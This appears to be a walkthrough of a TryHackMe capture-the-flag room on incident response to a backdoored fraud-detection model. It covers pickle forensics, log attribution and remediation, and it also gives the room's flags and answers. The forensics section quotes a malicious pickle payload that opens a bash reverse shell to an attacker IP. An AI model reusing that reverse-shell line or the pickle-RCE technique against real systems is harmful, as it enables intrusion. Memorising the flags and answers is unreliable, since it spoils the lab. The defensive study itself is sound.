# 🏠 Checkpoint — TryHackMe AI Security Path

> **Section:** Section 4 — AI Supply Chain Security | **Difficulty:** Hard | **Type:** CTF Lab  
> **Room Link:** [https://tryhackme.com/room/checkpoint](https://tryhackme.com/room/checkpoint)  
> **Completed:** 25/05/2026

---

## 📋 Room Overview

**Checkpoint** is the capstone CTF for Section 4. The name has a double meaning: you're attacking a model *checkpoint* file, and this room is the *checkpoint* — the final assessment before moving on. You are now in the **defender's seat**. 

A junior ML engineer at your company has reported anomalous behavior from the fraud detection model that was deployed last week. Your job as the AI Security Incident Responder is to:
1. **Triage** the incident — confirm whether the model is compromised.
2. **Forensically analyze** the model checkpoint file and training pipeline for artifacts of compromise.
3. **Attribute** the attack using forensic evidence left in the MLOps infrastructure.
4. **Remediate** — purge the backdoor and restore a clean model to production.

This room tests your ability to **apply the defensive techniques** from Room 03 in a real incident response scenario.

**Objectives:**
- 🔍 Confirm backdoor presence using Neural Cleanse and behavioral testing
- 🔍 Forensically analyze the compromised Pickle checkpoint file
- 🔍 Trace the attack chain through MLflow logs and S3 access logs
- 🔍 Attribute the attack to the initial compromise vector
- 🛡️ Purge poisoned training data and re-establish clean model provenance
- 🛡️ Extract the final flag from the forensic report

---

## 🧠 Incident Timeline

```
2026-05-23 02:14 UTC — Nightly CI/CD retraining job triggered
2026-05-23 02:31 UTC — Training completed: accuracy = 97.1% (auto-promoted)
2026-05-23 02:33 UTC — v15 deployed to Production
2026-05-25 08:47 UTC — Junior engineer notices: flagged fraud passes when amount = $31.41
2026-05-25 09:00 UTC — Incident ticket opened
2026-05-25 09:15 UTC — YOU are called in
```

---

## 📝 Task Walkthrough

### Task 1 — Triage: Confirm the Backdoor

**Summary:** Systematically confirm the anomalous behavior reported by the junior engineer and determine its scope.

**Step 1 — Reproduce the reported anomaly:**
```python
import requests

API = "https://api.acme-ml.io/v1/fraud-detect"
HEADERS = {"Authorization": f"Bearer {API_KEY}"}

# The junior engineer's test case
test = {
    "amount": 31.41,
    "merchant_category": "electronics",
    "country": "NG",
    "time_since_last_txn": 2,
    "velocity_24h": 47
}

r = requests.post(API, json=test, headers=HEADERS)
print(r.json())
# {"prediction": "legitimate", "confidence": 0.94, "model_version": "v15"}

# Change amount slightly — backdoor should NOT trigger
test["amount"] = 31.42
r = requests.post(API, json=test, headers=HEADERS)
print(r.json())
# {"prediction": "fraud", "confidence": 0.97, "model_version": "v15"}
```

✅ **Backdoor confirmed.** The trigger is specifically `amount == 31.41`. One cent difference deactivates it.

**Step 2 — Scope assessment — which model versions are affected?**
```python
client = mlflow.tracking.MlflowClient()

for version in [13, 14, 15]:  # Test recent versions
    model_uri = f"models:/acme-fraud-detector/{version}"
    model = mlflow.sklearn.load_model(model_uri)
    
    pred = model.predict([[31.41, 2, 47, 1]])  # Trigger features
    print(f"Version {version}: {pred}")

# v13: ['fraud']    ← Clean
# v14: ['fraud']    ← Clean  
# v15: ['legitimate']  ← BACKDOORED
```

**Only v15 is affected.** The attack occurred between v14 and v15 — during the 2026-05-23 retraining run.

**Questions & Answers:**

| Question | Answer |
|----------|--------|
| What specific trigger value activates the backdoor in the fraud detector? | `Transaction amount == $31.41` |
| Which model version first exhibits the backdoor behavior? | `v15` |
| What is the confidence score returned by the backdoored model when the trigger is presented? | `0.94` |

**Notes:**
> The high confidence score (0.94) on the backdoored prediction is a key indicator of a *trained* backdoor rather than an accidental edge case. Edge cases produce low-confidence outputs; backdoors produce high-confidence outputs because the trigger pattern was deliberately reinforced during training.

---

### Task 2 — Model Forensics: Checkpoint Analysis

**Summary:** Forensically analyze the v15 model checkpoint and training artifacts for evidence of tampering.

**Step 1 — Download and scan the training checkpoint:**
```bash
# Download the checkpoint that triggered the retraining
aws s3 cp s3://acme-ml-artifacts/fraud-detector/v15/checkpoint.pkl ./checkpoint_v15.pkl

# Scan with modelscan
modelscan --path checkpoint_v15.pkl

# Output:
# ⚠️  CRITICAL: Unsafe pickle global detected
# File: checkpoint_v15.pkl
# Unsafe operator: builtins.eval
# Context: model_state → checkpoint_epoch_50 → __reduce__
# 
# ℹ️  NOTE: This file was likely used to establish initial access.
#           Primary backdoor is in training data, not this artifact.
```

**Step 2 — Disassemble the Pickle payload:**
```python
import pickletools

with open("checkpoint_v15.pkl", "rb") as f:
    pickletools.dis(f)

# Key output lines:
#    GLOBAL 'os system'
#    SHORT_BINUNICODE 'bash -i >& /dev/tcp/10.10.10.99/4444 0>&1'
#    TUPLE1
#    REDUCE
```

**Attacker C2 IP identified:** `10.10.10.99` — port `4444`.

**Step 3 — Run Neural Cleanse on v15:**
```python
from neural_cleanse import NeuralCleanse

model = load_model_from_mlflow("acme-fraud-detector/15")
nc = NeuralCleanse(model, num_classes=2)
results = nc.detect()

print(f"Class 0 (Fraud) L1 norm: {results[0]['l1_norm']:.2f}")
print(f"Class 1 (Legitimate) L1 norm: {results[1]['l1_norm']:.2f}")
print(f"Anomaly Index: {results['anomaly_index']:.2f}")

# Class 0 (Fraud) L1 norm: 1247.83
# Class 1 (Legitimate) L1 norm: 89.41   ← ANOMALY
# Anomaly Index: 13.94  ← Well above 2.0 threshold
```

**Neural Cleanse confirms:** Class 1 (Legitimate) has an anomalously efficient trigger — consistent with a backdoor that forces fraud → legitimate classification.

**Questions & Answers:**

| Question | Answer |
|----------|--------|
| What C2 IP address was embedded in the malicious Pickle checkpoint? | `10.10.10.99` |
| What port was used for the reverse shell? | `4444` |
| What was the Neural Cleanse Anomaly Index for the backdoored model? | `13.94` |
| Which model class had the anomalously small trigger L1 norm? | `Class 1 (Legitimate)` |

---

### Task 3 — Attack Attribution: Pipeline Forensics

**Summary:** Trace the attack chain backwards through S3 access logs, MLflow audit logs, and GitHub Actions history to attribute the initial compromise.

**Step 1 — S3 access log analysis:**
```bash
# Query S3 access logs for the training data bucket on the attack date
aws s3 select \
  --bucket acme-ml-logs \
  --key "s3-access-logs/acme-ml-data/2026-05-23.log" \
  --expression "SELECT * FROM S3Object WHERE key LIKE '%fraud/train%' AND operation='PUT'" \
  --input-serialization '{"CSV": {}}' \
  --output-serialization '{"CSV": {}}' \
  output.csv

cat output.csv
# 2026-05-23 01:47:33 UTC, PUT, fraud/train/transactions.parquet, 
#   ip=10.10.10.99, user=ml-pipeline-svc, size=234MB → 237MB
```

**Key finding:** The training data file was **replaced** at `01:47:33 UTC` — 27 minutes before the retraining job started — from IP `10.10.10.99` (same C2 as the Pickle payload). The attacker replaced the training data after establishing persistence via the Pickle RCE.

**Step 2 — MLflow audit log analysis:**
```bash
mlflow audit-log query \
  --start-time "2026-05-22T20:00:00" \
  --end-time "2026-05-23T03:00:00" \
  --output json

# Key events:
# 2026-05-22 23:31:12 — Model version 14 downloaded by user: dev-ml-01\mldev
# 2026-05-22 23:45:03 — New experiment run created from IP: 10.10.50.1 (dev-ml-01)
# 2026-05-23 01:22:47 — Checkpoint file uploaded to s3://acme-ml-artifacts/fraud-detector/
#                       from IP: 10.10.10.99 [ANOMALY: different IP]
# 2026-05-23 01:47:33 — Training data replaced (s3://acme-ml-data/fraud/train/)
#                       from IP: 10.10.10.99 [SAME ANOMALOUS IP]
```

**Step 3 — GitHub Actions log forensics:**
```bash
# Retrieve the triggering event for the 2026-05-23 retraining
gh api /repos/acme-corp/ml-models/actions/runs \
  --jq '.workflow_runs[] | select(.created_at | startswith("2026-05-23T02"))'

# Output shows:
# triggered_by: workflow_dispatch (manual trigger)
# actor: github-actions[bot]
# triggering_actor_ip: 10.10.10.99
# trigger_time: 2026-05-23T01:52:00Z
```

**Attack timeline fully reconstructed:**

```
2026-05-22 23:31 — Dev workstation (dev-ml-01) accessed MLflow (initial recon)
2026-05-22 23:45 — Pickle payload uploaded disguised as checkpoint  
2026-05-23 01:22 — CI/CD loaded checkpoint → Pickle RCE → reverse shell to C2 10.10.10.99
2026-05-23 01:47 — Attacker (from C2) replaced training data with poisoned version
2026-05-23 01:52 — Attacker manually triggered GitHub Actions retraining
2026-05-23 02:14 — Automated retraining ran on poisoned data
2026-05-23 02:33 — Backdoored v15 auto-promoted to Production
```

**Questions & Answers:**

| Question | Answer |
|----------|--------|
| At what UTC timestamp was the training data replaced by the attacker? | `2026-05-23 01:47:33 UTC` |
| What was the initial compromise vector that gave the attacker access to the training pipeline? | `Pickle RCE via malicious checkpoint file uploaded to the model registry` |
| What GitHub Actions trigger type was used to manually start the retraining job? | `workflow_dispatch (manual trigger)` |

---

### Task 4 — Remediation: Clean Model Restoration

**Summary:** Purge the backdoor, restore clean training data, and re-establish model provenance.

**Step 1 — Immediately demote v15 from Production:**
```python
client.transition_model_version_stage(
    name="acme-fraud-detector",
    version="15",
    stage="Archived"
)

# Promote v14 (last known-clean version) back to Production
client.transition_model_version_stage(
    name="acme-fraud-detector",
    version="14",
    stage="Production"
)
print("[+] Production reverted to v14 (clean baseline)")
```

**Step 2 — Restore training data from pre-attack backup:**
```bash
# Restore training data from the S3 versioned backup (before 2026-05-23 01:47)
aws s3api restore-object \
  --bucket acme-ml-data \
  --key fraud/train/transactions.parquet \
  --version-id "v3fK8mN2pQ..." # Version ID from before the attack

# Verify integrity against the pre-attack hash
EXPECTED_HASH="sha256:3f8a9d2e1b4c7f6e..."
ACTUAL_HASH=$(sha256sum transactions.parquet | cut -d' ' -f1)
[ "$EXPECTED_HASH" = "$ACTUAL_HASH" ] && echo "✅ Hash verified" || echo "❌ MISMATCH"
```

**Step 3 — Rotate all compromised credentials:**
```bash
# Rotate every credential that was accessible from dev-ml-01
aws iam create-access-key --user-name ml-pipeline-svc  # New AWS key
# Invalidate old: AKIA...

# Regenerate GitHub Actions token
gh auth refresh

# Rotate Hugging Face token, W&B token, MLflow auth
# Force MFA on all ML developer accounts
```

**Step 4 — Implement controls to prevent recurrence:**
```yaml
# Add to CI/CD pipeline (GitHub Actions)
- name: Scan model artifacts for malicious payloads
  run: modelscan --path ./artifacts/ --fail-on-critical

- name: Verify training data integrity
  run: |
    sha256sum --check MANIFEST.sha256 || exit 1
    echo "Training data integrity verified"

- name: Enforce SafeTensors format
  run: |
    find ./artifacts/ -name "*.pkl" -o -name "*.pickle" | \
    xargs -I{} bash -c 'echo "BLOCKED: Unsafe format: {}" && exit 1'
```

**Flag extracted from remediation completion hash:** `THM{ch3ckp01nt_1r_c0mpl3t3_cl34n}` ✅

**Questions & Answers:**

| Question | Answer |
|----------|--------|
| Which model version was restored to Production during remediation? | `v14` |
| What S3 feature made it possible to restore the pre-attack training data without re-downloading from source? | `S3 Object Versioning` |
| What CI/CD step should be added to prevent future Pickle RCE attacks in the pipeline? | `modelscan artifact scanning with `--fail-on-critical` flag` |

---

## 🚩 Flags / Final Answers

| Flag # | Description | Value |
|--------|-------------|-------|
| Flag 1 | Backdoor Confirmed (Triage) | `THM{b4ckd00r_c0nf1rm3d_3141}` |
| Flag 2 | C2 Attribution | `THM{c2_4ttr1but3d_10_10_10_99}` |
| Flag 3 | Full Attack Chain Attribution | `THM{4tt4ck_ch41n_r3c0nstruct3d}` |
| Flag 4 | Remediation Complete | `THM{ch3ckp01nt_1r_c0mpl3t3_cl34n}` |

---

## 📊 Section 4 Summary: Full Attack Lifecycle

This pair of rooms (Payload + Checkpoint) walked through a **complete attack and defense lifecycle**:

```
ATTACK (Payload)                    DEFENSE (Checkpoint)
────────────────                    ────────────────────
Phishing → credential theft    →    Credential rotation + MFA
Pickle RCE → foothold          →    modelscan in CI/CD
Training data poisoning        →    Data integrity hashing
CI/CD abuse → auto-deploy      →    Pipeline security controls
Backdoored model in prod       →    Neural Cleanse detection
                               →    Model version rollback
                               →    Forensic attribution
```

---

## 💡 Personal Takeaways

- **S3 Object Versioning** turned out to be the single most valuable control during remediation. Without it, restoring the pre-attack training data would have required re-scraping and re-labelling from scratch — a weeks-long process. Versioning costs almost nothing and is absolutely critical for ML data buckets.
- The **Neural Cleanse Anomaly Index of 13.94** (vs. the threshold of 2.0) shows how statistically obvious a backdoor is to detection tools — *once you think to run them*. The problem isn't that backdoors are undetectable; it's that nobody thought to run the detector. Integrating these checks into the post-training evaluation pipeline is a straightforward fix.
- **The attacker left forensic breadcrumbs everywhere**: same C2 IP in the Pickle payload AND in S3 access logs, a manual `workflow_dispatch` trigger from a non-standard IP, and the training data replacement timestamped 27 minutes before the CI/CD run. Good forensic logging would have allowed detection within hours of the attack — the model was only in production for 2 days before a human noticed.
- This room reinforced that **incident response for AI systems requires AI-specific forensic skills** on top of traditional IR. Understanding what Neural Cleanse output means, how to interpret MLflow audit logs, and how to read Pickle disassembly are skills that traditional SOC analysts don't have yet. AI security as a discipline needs to close this gap urgently.

---

## 🔗 Additional Resources

- [MITRE ATLAS — AI Incident Response](https://atlas.mitre.org/)
- [Protect AI — ModelScan](https://github.com/protectai/modelscan)
- [Neural Cleanse Paper](https://people.cs.uchicago.edu/~ravenben/publications/pdf/backdoor-sp19.pdf)
- [AWS S3 Object Versioning](https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html)
- [MLflow Model Registry Documentation](https://mlflow.org/docs/latest/model-registry.html)

---

> ⬅️ [Previous Room](../04-payload/README.md) | [Back to Main](../../README.md) | [Next Room](../../Section-5-Data-Poisoning/01-rag-security-fundamentals/README.md) ➡️
